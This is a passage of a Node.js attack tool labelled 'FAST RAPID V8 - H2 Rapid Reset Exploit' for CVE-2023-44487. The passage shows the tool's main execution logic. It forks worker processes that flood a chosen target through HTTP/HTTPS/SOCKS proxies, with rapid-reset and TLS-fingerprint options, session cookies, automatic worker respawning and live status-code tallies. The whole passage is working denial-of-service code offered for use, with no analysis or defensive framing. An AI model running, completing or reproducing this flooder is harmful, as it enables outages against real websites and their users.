        const sessionCookies = get_cookies_for_domain(currentTargetUrl.hostname);
        if (sessionCookies) headers['cookie'] = sessionCookies;
    }

    return headers;
};

const EnhancedStatusMessage = function (statusData, ispInfo, proxyStats) {
    const colors = { reset: '\x1b[0m', green: '\x1b[32m', red: '\x1b[31m', yellow: '\x1b[33m', blue: '\x1b[34m', magenta: '\x1b[35m', cyan: '\x1b[36m' };
    if (typeof statusData === 'object') {
        const statusCodes = [];
        for (let code in statusData) {
            const color = code.startsWith('2') ? colors.green : code.startsWith('3') ? colors.yellow : (code.startsWith('4') || code.startsWith('5')) ? colors.red : colors.blue;
            statusCodes.push(`${color}${code}: ${statusData[code]}${colors.reset}`);
        }
        console.log(`Status: ${statusCodes.join(', ')}`);
        const total = Object.values(statusData).reduce((sum, count) => sum + count, 0);
        console.log(`${colors.green}Total Requests: ${total}${colors.reset}`);
        const activeProxies = proxyStats.filter(p => p.priority !== -1).length;
        console.log(`${colors.cyan}Proxies: ${activeProxies}/${proxyStats.length} active${colors.reset}`);
        if (ispInfo && ispInfo.isp) console.log(`${colors.blue}ISP: ${ispInfo.isp} | Country: ${ispInfo.country || 'Unknown'}${colors.reset}`);
    }
};

// Main execution flow
if (cluster.isMaster) {
    console.log(`
  ╔══════════════════════════════════════════════════════════╗
  ║     FAST RAPID V8 - H2 Rapid Reset Exploit              ║
  ║     CVE-2023-44487 | Full Proxy Support                 ║
  ╚══════════════════════════════════════════════════════════╝
    `);

    let attackConfig = null;
    let currentISPInfo = null;

    getConfiguration().then(config => {
        attackConfig = config;
        currentISPInfo = config.ispInfo;

        console.log(`Target: ${trg}`);
        console.log(`Duration: ${time} seconds`);
        console.log(`Threads: ${threads} | Rate: ${rate} | Connections: ${connections} | Streams: ${streams}`);
        console.log(`Detected Profile: ${config.name}`);
        console.log(`Proxies Loaded: ${proxyList.length} (HTTP/HTTPS/SOCKS4/SOCKS5)`);
        if (currentISPInfo && currentISPInfo.isp) console.log(`Target ISP: ${currentISPInfo.isp}`);
        console.log(`HTTP Version: ${http_opt === '1' ? 'HTTP/1.1' : http_opt === '2' ? 'HTTP/2' : 'HTTP/2 + HTTP/1.1'}`);
        if (extra_opt) console.log(`Extra Headers: Enabled`);
        if (reset_opt) console.log(`Rapid Reset Exploit: Enabled`);
        if (fingerprint_opt) console.log(`TLS Fingerprint: Enabled`);
        console.log(`\nAttack starting...\n`);

        for (let i = 0; i < threads; i++) {
            cluster.fork({ core: i % os.cpus().length });
        }
    }).catch(err => {
        console.log('Error initializing attack:', err);
        process.exit(1);
    });

    const workerStat = {};

    cluster.on('exit', (worker, code, signal) => {
        cluster.fork({ core: worker.id % os.cpus().length });
    });

    cluster.on('message', (worker, message) => {
        workerStat[worker.id] = [worker, message];
    });

    setInterval(() => {
        let combinedStat = {};
        for (let w in workerStat) {
            if (workerStat[w][0].state == 'online') {
                for (let st of workerStat[w][1]) {
                    if (typeof st === 'object') {
                        for (let code in st) {
                            if (combinedStat[code] == null) combinedStat[code] = 0;
                            combinedStat[code] += st[code];
                        }
                    }
                }
            }
        }
        console.clear();
        console.log(`Target: ${trg}`);
        if (currentTargetUrl.href !== trgUrl.href) console.log(`Current: ${currentTargetUrl.href}`);
        EnhancedStatusMessage(combinedStat, currentISPInfo, proxyStats);
    }, 1000);

    setTimeout(() => {
        console.log('\nAttack completed. Exiting...');
        process.exit();
    }, time * 1000);

} else {
    let workerConfig = null;

    const initWorker = async () => {
        workerConfig = await getConfiguration();
        setInterval(() => Flooder(workerConfig), 1);
        setInterval(() => {
            if (mainStat.length >= 4) mainStat.shift();
            mainStat.push(statCounts);
            statCounts = {};
            process.send(mainStat);
        }, 950);
    };
    initWorker();
    setTimeout(() => process.exit(), time * 1000);
}